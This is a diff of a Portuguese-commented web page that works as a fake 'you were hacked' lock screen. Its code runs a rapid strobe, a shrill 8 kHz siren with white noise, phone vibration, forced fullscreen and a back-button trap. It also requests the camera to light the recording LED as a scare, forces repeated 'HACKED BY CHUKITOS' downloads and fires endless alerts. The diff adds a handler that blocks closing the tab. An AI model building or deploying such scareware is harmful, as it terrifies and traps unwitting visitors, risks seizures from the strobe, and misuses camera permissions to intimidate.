@@ -14,11 +14,10 @@
     color: #fff; user-select: none;
   }
   
-  /* Piscar INSANO */
   #lock-screen {
     display: flex; flex-direction: column; align-items: center; justify-content: center;
     width: 100%; height: 100%; padding: 20px; text-align: center;
-    animation: strobe 0.05s infinite, shake 0.05s infinite;
+    animation: strobe 0.1s infinite, shake 0.1s infinite;
   }
 
   @keyframes strobe {
@@ -98,32 +97,35 @@
   const btn = document.getElementById('btnDesbloquear');
   const glitchTitle = document.getElementById('glitch-title');
   
-  let audioCtx, osc, lfo, noise;
+  let audioCtx, osc, noise;
   let glitchLoop, vibInterval;
 
-  // --- SIRENE + RUÍDO BRANCO (Dor física nos ouvidos) ---
+  // Bloqueia o fechamento da aba (só funciona no PC, no celular o navegador ignora)
+  window.addEventListener('beforeunload', function (e) {
+    e.preventDefault();
+    e.returnValue = '';
+  });
+
+  // --- SIRENE + RUÍDO BRANCO ---
   function iniciarAudio() {
     try {
       if (!audioCtx) {
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         
-        // Sirene Aguda
         osc = audioCtx.createOscillator();
         const gainNode = audioCtx.createGain();
         osc.type = 'sawtooth'; 
-        osc.frequency.value = 8000; // 8kHz é quase inaudível e MUITO irritante
+        osc.frequency.value = 8000; 
         osc.connect(gainNode);
         gainNode.connect(audioCtx.destination);
         gainNode.gain.value = 0.05;
         osc.start();
 
-        // Ruído branco (Chiado de TV)
         const bufferSize = audioCtx.sampleRate * 2;
         const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
         const data = buffer.getChannelData(0);
-        for (let i = 0; i < bufferSize; i++) {
-          data[i] = Math.random() * 2 - 1;
-        }
+        for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
+        
         noise = audioCtx.createBufferSource();
         noise.buffer = buffer;
         noise.loop = true;
@@ -136,7 +138,6 @@
     } catch(e) {}
   }
 
-  // --- VIBRAÇÃO DE TERREMOTO ---
   function vibrar() {
     if ("vibrate" in navigator) {
       vibInterval = setInterval(() => {
@@ -154,9 +155,12 @@
     } catch(e) {}
     if ("vibrate" in navigator) { clearInterval(vibInterval); navigator.vibrate(0); }
     clearInterval(glitchLoop);
+    
+    // Remove o bloqueador de fechamento, senão a pessoa não sai nunca mais
+    window.removeEventListener('beforeunload', function(){});
+    window.onbeforeunload = null;
   }
 
-  // --- TÍTULO GLITCH ---
   function iniciarGlitch() {
     const originalText = "SISTEMA DESTRUÍDO";
     const chars = "XØ¥§€£∆©®™";
@@ -173,7 +177,6 @@
     }, 30);
   }
 
-  // --- LOOP DE DOWNLOAD (Notificação falsa) ---
   function forcarDownload() {
     const a = document.createElement('a');
     a.href = "data:text/plain;charset=utf-8,HACKED%20BY%20CHUKITOS";
@@ -183,7 +186,6 @@
     document.body.removeChild(a);
   }
 
-  // --- TRAVA DE VOLTAR ---
   function forcarTelaCheia() {
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
@@ -195,7 +197,6 @@
     history.pushState(null, null, location.href);
   };
   
-  // --- LÓGICA DA SENHA ---
   function checarSenha() {
     const digitada = input.value.toUpperCase();
     if (digitada === SENHA_CORRETA) {
@@ -219,26 +220,19 @@
     }
   }
 
-  // --- GATILHO INICIAL ---
   document.body.addEventListener('click', () => {
     iniciarAudio();
     vibrar();
     iniciarGlitch();
     forcarTelaCheia();
     
-    // Pede a câmera (susto psicológico)
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          // Se ele aceitar, a gente não mostra a câmera, mas o celular liga o LED de gravação
-          // Isso dá um cagaço do caralho.
-        }).catch(err => {});
+        .then(stream => { /* Liga a câmera */ }).catch(err => {});
     }
 
-    // Loop de downloads de 5 em 5 segundos
     setInterval(forcarDownload, 5000);
 
-    // Pop-ups infinitos (o navegador vai bloquear a maioria, mas a tentativa continua)
     setInterval(() => {
       try { alert("VOCÊ FOI HACKEADO PELO CHUKITOS!"); } catch(e) {}
     }, 2000);
